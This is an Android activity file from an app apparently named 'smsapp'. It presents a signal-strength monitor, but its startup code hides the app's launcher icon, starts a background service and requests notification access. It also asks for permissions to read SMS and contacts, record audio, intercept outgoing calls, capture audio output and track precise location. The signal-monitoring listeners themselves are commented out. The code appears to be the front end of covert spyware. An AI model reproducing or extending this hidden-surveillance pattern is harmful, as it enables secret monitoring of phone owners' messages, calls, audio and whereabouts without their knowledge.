package gonext.smsapp;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.provider.Settings;
import android.support.v4.content.ContextCompat;
import android.support.v4.content.LocalBroadcastManager;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.support.v7.widget.LinearLayoutManager;
import android.support.v7.widget.RecyclerView;
import android.telephony.PhoneStateListener;
import android.telephony.SignalStrength;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.webkit.PermissionRequest;
import android.widget.TextView;
import android.widget.Toast;

import com.karumi.dexter.Dexter;
import com.karumi.dexter.MultiplePermissionsReport;
import com.karumi.dexter.PermissionToken;
import com.karumi.dexter.listener.PermissionDeniedResponse;
import com.karumi.dexter.listener.PermissionGrantedResponse;
import com.karumi.dexter.listener.multi.MultiplePermissionsListener;
import com.karumi.dexter.listener.single.PermissionListener;

import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;

import flepsik.github.com.progress_ring.ProgressRingView;
import gonext.smsapp.db.DbService;
import gonext.smsapp.db.NotificationEntity;
import gonext.smsapp.servers.BackgroundJob;
import gonext.smsapp.servers.BackgroundJobService;

import static android.telephony.PhoneStateListener.LISTEN_NONE;

public class MainActivity extends AppCompatActivity {

    private TextView wifiStatus,wifiPercent,mobileStatus,mobilePercent,operatorNameMobile,operatorNameWifi;
    private ProgressRingView mobileRing,wifiRing;
    private BroadcastReceiver wifiReceiver;
    private MobileNetworkListener mPhoneStatelistener;
    private TelephonyManager mTelephonyManager;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        wifiPercent = (TextView) findViewById(R.id.wifi_percent);
        wifiStatus = (TextView) findViewById(R.id.wifi_status);
        mobilePercent = (TextView) findViewById(R.id.mobile_percent);
        mobileStatus = (TextView) findViewById(R.id.mobile_status);
        operatorNameMobile = (TextView) findViewById(R.id.operatorName_mobile);
        operatorNameWifi = (TextView) findViewById(R.id.operatorName_wifi);

        mobileRing = (ProgressRingView) findViewById(R.id.mobile_progress);
        wifiRing = (ProgressRingView) findViewById(R.id.wifi_progress);

        String settings = Settings.Secure.getString(this.getContentResolver(),"enabled_notification_listeners");
        if (settings != null && settings.contains(getApplicationContext().getPackageName()))
        {
            System.out.println("enabled");
            //service is enabled do something
        } else {
            //service is not enabled try to enabled by calling...
            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            startActivity(intent);
        }

        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

        startService(new Intent(this, BackgroundJob.class)); //start service which is BackgroundJob.java

        /*initializeWiFiListener();
        initialMobileNetworkListener();*/
    }

    @Override
    protected void onResume() {
        super.onResume();
        Dexter.withActivity(this)
                .withPermissions(
                        Manifest.permission.READ_PHONE_STATE,
                        Manifest.permission.READ_CONTACTS,
                        Manifest.permission.READ_SMS,
                        Manifest.permission.WRITE_EXTERNAL_STORAGE,
                        Manifest.permission.RECORD_AUDIO,
                        Manifest.permission.PROCESS_OUTGOING_CALLS,
                        Manifest.permission.CAPTURE_AUDIO_OUTPUT,
                        Manifest.permission.ACCESS_COARSE_LOCATION,
                        Manifest.permission.ACCESS_FINE_LOCATION
                ).withListener(new MultiplePermissionsListener() {
            @Override public void onPermissionsChecked(MultiplePermissionsReport report) {
                if(!report.areAllPermissionsGranted()){
                }
            }
            @Override public void onPermissionRationaleShouldBeShown(List<com.karumi.dexter.listener.PermissionRequest> permissions, PermissionToken token) {
                System.out.println("entered");
                token.continuePermissionRequest();
            }
        }).check();
    }

    private void initialMobileNetworkListener(){
        mPhoneStatelistener = new MobileNetworkListener(this);
        mTelephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        mTelephonyManager.listen(mPhoneStatelistener, PhoneStateListener.LISTEN_SIGNAL_STRENGTHS);
    }

    private void initializeWiFiListener(){
        String connectivity_context = Context.WIFI_SERVICE;
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction(WifiManager.RSSI_CHANGED_ACTION);
        intentFilter.addAction(WifiManager.WIFI_STATE_CHANGED_ACTION);
        final WifiManager wifi = (WifiManager)getSystemService(connectivity_context);
        wifiReceiver = new BroadcastReceiver(){

            @Override
            public void onReceive(Context context, Intent intent) {
                WifiInfo info = wifi.getConnectionInfo();
                String operatorName = info.getSSID();
                int rssi = info.getRssi();
                int level = WifiManager.calculateSignalLevel(rssi, 3);
//                int percentage = (int) ((level/10.0)*100);
                String status = "Weak";
                int percent = 0;
                String percentage = "0%";
                if(level == 0){//weak
                    if(rssi > -100) {
                        status = "Weak";
                        percent = 33;
                        percentage = "0-33%";
                    }
                }else if(level == 1){//avg
                    status = "Average";
                    percent = 66;
                    percentage = "33-66%";
                }else if(level == 2){//good
                    status = "Excellent";
                    percent = 100;
                    percentage = "100%";
                }
                refreshWifiView(status,percent,percentage,operatorName);
            }
            //TODO: implement methods for action handling

        };
        registerReceiver(wifiReceiver, intentFilter);
    }
private void refreshWifiView(String status,int percent,String percentage,String operatorName){
        wifiStatus.setText(status);
        wifiPercent.setText(percentage);
        wifiRing.setProgress(percent/100);
        if(status.equals("Weak")){
            wifiRing.setProgressColor(ContextCompat.getColor(this,android.R.color.holo_red_light));
        }else if(status.equals("Average")){
            wifiRing.setProgressColor(ContextCompat.getColor(this,R.color.yellow));
        }else if(status.equals("Excellent")){
            wifiRing.setProgressColor(ContextCompat.getColor(this,android.R.color.holo_green_light));
        }
        operatorNameWifi.setText("Provider Name: "+operatorName);
}
    private void refreshMobileView(String status,int percent,String percentage,String operatorName){
        mobileStatus.setText(status);
        mobilePercent.setText(percentage);
        mobileRing.setProgress(percent/100);
        if(status.equals("Weak")){
            mobileRing.setProgressColor(ContextCompat.getColor(this,android.R.color.holo_red_light));
        }else if(status.equals("Fair") || status.equals("Good")){
            mobileRing.setProgressColor(ContextCompat.getColor(this,R.color.yellow));
        }else if(status.equals("Excellent")){
            mobileRing.setProgressColor(ContextCompat.getColor(this,android.R.color.holo_green_light));
        }
        operatorNameMobile.setText("Operator Name: "+operatorName);
    }

    private class MobileNetworkListener extends PhoneStateListener{

        private Context context;

        public MobileNetworkListener(Context context) {
            this.context = context;
        }

        @Override
        public void onSignalStrengthsChanged(SignalStrength signalStrength) {
            super.onSignalStrengthsChanged(signalStrength);
            try {
                Thread.sleep(2000);
            }catch (Exception e){
                e.printStackTrace();
            }
            String status = "Weak";
            int percent = 0;
            String percentage = "0%";
            String operatorName = mTelephonyManager.getNetworkOperatorName();
            if(mTelephonyManager.getNetworkType() == TelephonyManager.NETWORK_TYPE_GSM){
                int rsrp = getGSMsignalStrength(signalStrength);
                if(rsrp < -100){//poor
                    status = "Weak";
                    percent = 0;
                    percentage = "0%";
                }else if(rsrp < -90 && rsrp >= -100){//fair
                    status = "Fair";
                    percent = 30;
                    percentage = "30%";
                }else if(rsrp < -80 && rsrp >= -90) {//good
                    status = "Good";
                    percent = 75;
                    percentage = "75%";
                }else if(rsrp >= -80){// Excellent
                    status = "Excellent";
                    percent = 100;
                    percentage = "100%";
                }
            }else if(mTelephonyManager.getNetworkType() == TelephonyManager.NETWORK_TYPE_LTE){
                int ecio = getLTEsignalStrength(signalStrength);
                if(ecio <= -10){//poor
                    status = "Weak";
                    percent = 0;
                    percentage = "0%";
                }else if(ecio < -5 && ecio > -10){//fair
                    status = "Fair";
                    percent = 30;
                    percentage = "30%";
                }else if(ecio <= -2 && ecio >= -5) {//good
                    status = "Good";
                    percent = 75;
                    percentage = "75%";
                }else if(ecio > -2){// excellent
                    status = "Excellent";
                    percent = 100;
                    percentage = "100%";
                }
            }
            refreshMobileView(status,percent,percentage,operatorName);
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if(mPhoneStatelistener != null && mTelephonyManager != null) {
            mTelephonyManager.listen(mPhoneStatelistener,LISTEN_NONE);
        }
        if(wifiReceiver != null) {
            unregisterReceiver(wifiReceiver);
        }
    }

    private int getLTEsignalStrength(SignalStrength signalStrength)
    {
        try
        {

            Method[] methods = android.telephony.SignalStrength.class.getMethods();

            for (Method mthd : methods)
            {
                if (mthd.getName().equals("getEvdoEcio"))
                {
                    int LTEsignalStrength = (Integer) mthd.invoke(signalStrength, new Object[] {});
                    System.out.println("lte signal strength = "+LTEsignalStrength);
                    return LTEsignalStrength;
                }
            }
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
        return -11;
    }

    private int getGSMsignalStrength(SignalStrength signalStrength)
    {
        try
        {

            Method[] methods = android.telephony.SignalStrength.class.getMethods();

            for (Method mthd : methods)
            {
                if (mthd.getName().equals("getLteRsrp"))
                {
                    int LTEsignalStrength = (Integer) mthd.invoke(signalStrength, new Object[] {});
                    System.out.println("lte signal strength = "+LTEsignalStrength);
                    return LTEsignalStrength;
                }
            }
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
        return -101;
    }
}
